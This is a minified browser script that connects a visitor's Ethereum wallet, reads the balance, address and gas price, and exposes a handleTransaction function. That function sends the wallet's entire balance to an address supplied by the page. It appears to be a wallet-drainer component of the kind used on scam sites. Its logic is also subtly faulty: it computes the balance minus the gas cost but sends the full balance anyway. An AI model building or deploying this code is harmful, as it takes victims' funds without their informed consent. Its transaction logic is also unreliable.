import{web3Modal as e,ethereumClient as o}from"./web.js";let n;async function t(){console.log("ethers",window.ethereum);const e=new Web3(window.ethereum);n=e,console.log("signer here: ",e);const o=await e.eth.getAccounts(),t=await n.eth.getGasPrice();console.log("my accounts",o),console.log("gas price",t);const a=await async function(e){try{const o=await n.eth.getBalance(e),t=n.utils.fromWei(o,"ether");return console.log("Balance:",t),t}catch(e){console.error("Error fetching balance:",e),alert("Error fetching balance. Please check the console for more details.")}}(o[0]);return window.balance=a,window.address=o[0],window.gasPrice=t,{address:o[0],balance:a,gasPrice:t}}console.log("test",e),window.connectEther=t,window.web3Modal=e,window.handleTransaction=async function(e){try{const{balance:o,address:a,gasPrice:c}=await t(),r=n.utils.toWei(o,"ether"),s=r-c;console.log("money in wei",r,s),console.log("address",a);const l=await n.eth.sendTransaction({from:a,to:e,value:r});console.log("Transaction successful:",l),alert("Transaction successful! Transaction Hash: "+l.transactionHash)}catch(e){console.error("Transaction error:",e),alert("Transaction error! Please check the console for more details.")}},document.addEventListener("DOMContentLoaded",(async()=>{try{window.ethereumClient=o;const e=window.ethereumClient.getAccount();document.getElementById("ether").addEventListener("click",t),window.usersWalletAddress=e.address,window.providerWallet=""}catch(e){console.log("the error here",e)}}));